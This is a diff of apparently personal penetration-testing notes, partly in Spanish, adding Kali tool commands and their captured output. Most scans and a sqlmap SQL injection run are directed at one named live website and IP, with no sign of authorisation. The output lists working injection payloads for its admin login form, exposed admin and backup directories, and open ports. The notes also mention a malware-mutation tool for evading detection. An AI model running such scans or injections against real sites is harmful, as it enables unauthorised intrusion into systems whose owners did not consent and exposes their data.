@@ -309,7 +309,7 @@ For simplicity, I only run the core commands.
     > ls -tatlh putty-fake.exe
     -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe
 
-    3) pesidous -> weird, now i cannot run it... 
+    3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8
 
     https://kalilinuxtutorials.com/pesidious/
     
@@ -321,8 +321,21 @@ For simplicity, I only run the core commands.
     Python 3.6.13 :: Anaconda, Inc.
     > pip install pip==8.1.1
     > pip install -r pip_requirements/requirements.txt
+    python classifier.py -d /path/to/directory/with/malware/files
+    python mutate.py -d /path/to/directory/with/malware/files
 
     4) armitage
+    
+    Web interface for metasploit
+    
+    msfdb init
+    armitage
+    
+    https://localhost:5443/api/v1/auth/account
+    
+    https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml
+    
+    https://www.kali.org/tools/armitage/
 
 # Exploitation and hacking of websites -> You have to see this again.
 
@@ -333,6 +346,41 @@ For simplicity, I only run the core commands.
     3) inyeccion de código
 
     4) sqlMap
+    
+    Use Burp Suite to generate a txt file with POST request, then run this command:
+    
+    sqlmap -r post-petition.txt -p username -p password
+
+    https://hackertarget.com/sqlmap-post-request-injection/
+    
+    https://hackertarget.com/sqlmap-tutorial/
+    
+    After some minutes, you have this:
+    
+    ...
+    POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+    sqlmap identified the following injection point(s) with a total of 504 HTTP(s) requests:
+    ---
+    Parameter: password (POST)
+        Type: boolean-based blind
+        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' OR NOT 4956=4956#
+
+        Type: error-based
+        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(1193=1193,1))),0x7178707871),1193)-- pBsa
+
+        Type: time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND (SELECT 7242 FROM (SELECT(SLEEP(5)))dLML)-- bxut
+    ---
+    [17:33:50] [INFO] the back-end DBMS is MySQL
+    [17:33:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+    web server operating system: Linux Debian
+    web application technology: Apache 2.4.51, PHP 5.6.40
+    back-end DBMS: MySQL >= 5.6
+    [17:33:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/www.northernrich.com'
+
 
     5) path Traversal
 
@@ -457,8 +505,52 @@ For simplicity, I only run the core commands.
     sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com
 
 # Web path scanner
-    dirsearch -> TODO
-    DirBuster -> TODO
+    dirsearch -> 
+    
+    designed to brute force directories and files in webservers.
+
+    As a feature-rich tool, dirsearch gives users the opportunity to perform a complex web content discovering, with many vectors for the wordlist, high     accuracy, impressive performance, advanced connection/request settings, modern brute-force techniques and nice output.
+
+    https://www.kali.org/tools/dirsearch/
+    
+    > python --version
+    Python 3.9.12
+    > dirsearch --url=https://www.northernrich.com/en/ --wordlists /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
+
+      _|. _ _  _  _  _ _|_    v0.4.2
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29583
+
+    Output File: /home/kali/.dirsearch/reports/www.northernrich.com/-en-_22-07-04_18-42-46.txt
+
+    Error Log: /home/kali/.dirsearch/logs/errors-22-07-04_18-42-46.log
+
+    Target: https://www.northernrich.com/en/
+
+    [18:42:47] Starting: 
+    [18:42:59] 403 -    2KB - /en/.php                                         
+    [18:42:59] 200 -   19KB - /en/.                                            
+    [18:42:59] 403 -    2KB - /en/.html                                        
+    [18:43:12] 403 -    2KB - /en/.htaccess.bak1                               
+    [18:43:13] 403 -    2KB - /en/.htaccess.orig                               
+    [18:43:13] 403 -    2KB - /en/.htaccess.save
+    [18:43:13] 403 -    2KB - /en/.htaccessBAK
+    [18:43:13] 403 -    2KB - /en/.htm
+    [18:43:13] 403 -    2KB - /en/.htaccessOLD                                 
+    [18:43:13] 403 -    2KB - /en/.httr-oauth
+    [18:43:13] 403 -    2KB - /en/.htaccess.sample                             
+    [18:43:14] 403 -    2KB - /en/.htaccessOLD2                                
+    [18:43:21] 403 -    2KB - /en/.php3                                        
+    [18:51:45] 200 -   19KB - /en/index.html                                    
+    [18:56:05] 200 -   36KB - /en/register.php                                  
+
+    Task Completed 
+    
+    DirBuster -> Like above, but with a gui
+    
+    https://www.kali.org/tools/dirbuster/#dirbuster-1
+    
     Patator- password guessing attacks
 
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
@@ -478,6 +570,8 @@ For simplicity, I only run the core commands.
 # Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo...
 
     # http://ha.ckers.org/fierce/
+    https://github.com/mschwager/fierce
+    
     ./fierce.pl -dns example.com
     ./fierce.pl –dns example.com –wordlist myWordList.txt
 
@@ -485,22 +579,95 @@ For simplicity, I only run the core commands.
 
     nikto -C all -h http://IP
     nikto -C all -h 150.107.31.61
-    nikto -C all -h https://www.northernrich.com/en/
+    
+    > nikto -C all -h https://www.northernrich.com/en/
+    - Nikto v2.1.6
+    ---------------------------------------------------------------------------
+    + Target IP:          150.107.31.61
+    + Target Hostname:    www.northernrich.com
+    + Target Port:        443
+    ---------------------------------------------------------------------------
+    + SSL Info:        Subject:  /CN=northernrich.com
+                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
+    + Start Time:         2022-07-04 18:57:36 (GMT2)
+    ---------------------------------------------------------------------------
+    + Server: Apache/2.4.51 (Debian)
+    + The anti-clickjacking X-Frame-Options header is not present.
+    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect aga
+    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+    + The site uses SSL and Expect-CT header is not present.
+    + The X-Content-Type-Options header is not set. This could allow the user agent to render the conte
+    + Retrieved x-powered-by header: PHP/5.6.40-0+deb8u12
+    + Hostname 'www.northernrich.com' does not match certificate's names: northernrich.com
+    + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5157.
+    : Connection refused
+    + SCAN TERMINATED:  20 error(s) and 7 item(s) reported on remote host
+    + End Time:           2022-07-04 19:08:02 (GMT2) (626 seconds)
+    ---------------------------------------------------------------------------
+    + 1 host(s) teste
+    
 # WordPress scan Está en kali por defecto.
     git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
-    ./wpscan --url (https://www.northernrich.com/en/ –enumerate p
+    ./wpscan --url https://www.northernrich.com/en/ –enumerate p
 
 # HTTP fingerprint identification
 
     wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
     cd httprint_301/linux/
     ./httprint -h http://IP -s signatures.txt
+    
+    https://www.kali.org/tools/httprint/#httprint-1
+# Scan with dirb
 
+    Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt)
+        
+    > dirb https://www.northernrich.com /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+    DIRB v2.22    
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Jul  4 19:09:50 2022
+    URL_BASE: https://www.northernrich.com/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4612                                                          
+
+    ---- Scanning URL: https://www.northernrich.com/ ----
+    ==> DIRECTORY: https://www.northernrich.com/admin/                                                
+    ==> DIRECTORY: https://www.northernrich.com/api/                                                  
+    ==> DIRECTORY: https://www.northernrich.com/assets/                                               
+    ==> DIRECTORY: https://www.northernrich.com/backup/                                               
+    --> Testing: https://www.northernrich.com/emoticons                                               
+    --> Testing: https://www.northernrich.com/employee         
+    ...
+    
 # Scan with Skipfish
 
 # Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.
 
     skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+    
+    https://www.kali.org/tools/skipfish/#skipfish-1
+    
+    > skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o skipfish-northern -u https://www.northernrich.com/en/
+    skipfish web application scanner - version 2.10b
+    [*] Scan in progress, please stay tuned...
+
+    [+] Copying static resources...                                                                                                                                                                           
+    [+] Sorting and annotating crawl nodes: 19                                                                                                                                                                
+    [+] Looking for duplicate entries: 19                                                                                                                                                                     
+    [+] Counting unique nodes: 12                                                                                                                                                                             
+    [+] Saving pivot data for third-party tools...                                                                                                                                                            
+    [+] Writing scan description...                                                                                                                                                                           
+    [+] Writing crawl tree: 19                                                                                                                                                                                
+    [+] Generating summary views...                                                                                                                                                                           
+    [+] Report saved to 'skipfish-northern/index.html' [0x1e08a1da].                                                                                                                                          
+    [+] This was a great day for science!   
 
 # Use the NC scan
 
@@ -509,11 +676,46 @@ For simplicity, I only run the core commands.
 
 # Unicornscan
 
-# NOTE: Unicornscan is a tool for information gathering and security audits.
-
-    us -H -msf -Iv 192.168.56.101 -p 1-65535
-    us -H -mU -Iv 192.168.56.101 -p 1-65535
-
+# NOTE: Unicornscan is a tool for information gathering and security audits. como si hicieras nmap -p- --open
+    
+    https://www.kali.org/tools/unicornscan/
+    
+    sudo us -mTsf -Iv -r 1000 150.107.31.61:a
+    
+    sudo us -H -msf -Iv 150.107.31.61 -p 1-65535
+    ...
+    listener statistics 136150 packets recieved 0 packets droped and 0 interface drops
+    TCP open                     ftp[   21]         from ns21.appservhosting.com  ttl 128 
+    TCP open                     ssh[   22]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    smtp[   25]         from ns21.appservhosting.com  ttl 128 
+    TCP open                  domain[   53]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    http[   80]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    pop3[  110]         from ns21.appservhosting.com  ttl 128 
+    TCP open                  sunrpc[  111]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    imap[  143]         from ns21.appservhosting.com  ttl 128 
+    TCP open                   https[  443]         from ns21.appservhosting.com  ttl 128 
+    TCP open                     urd[  465]         from ns21.appservhosting.com  ttl 128 
+    TCP open              submission[  587]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    ftps[  990]         from ns21.appservhosting.com  ttl 128 
+    TCP open                   imaps[  993]         from ns21.appservhosting.com  ttl 128 
+    TCP open                   pop3s[  995]         from ns21.appservhosting.com  ttl 128 
+    TCP open                servexec[ 2021]         from ns21.appservhosting.com  ttl 128 
+    TCP open                    down[ 2022]         from ns21.appservhosting.com  ttl 128 
+    TCP open           scientia-ssdb[ 2121]         from ns21.appservhosting.com  ttl 128
+    
+    > sudo us -H -mU -Iv 150.107.31.61 -p 1-65535
+    adding 150.107.31.61/32 mode `UDPscan' ports `1-65535' pps 300
+    using interface(s) eth0
+    scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
+    UDP open 192.168.1.49:56700  ttl 128
+    UDP open 192.168.85.2:53  ttl 128
+    sender statistics 298.6 pps with 65544 packets sent total
+    listener statistics 80 packets recieved 0 packets droped and 0 interface drops
+    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
+    UDP open                  domain[   53]         from 192.168.85.2  ttl 128 
+    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
+    UDP open                 unknown[56700]         from 192.168.1.49  ttl 128
+    
 # Use Xprobe2 to identify the operating system fingerprint
 
     xprobe2 -v -p tcp:80:open IP
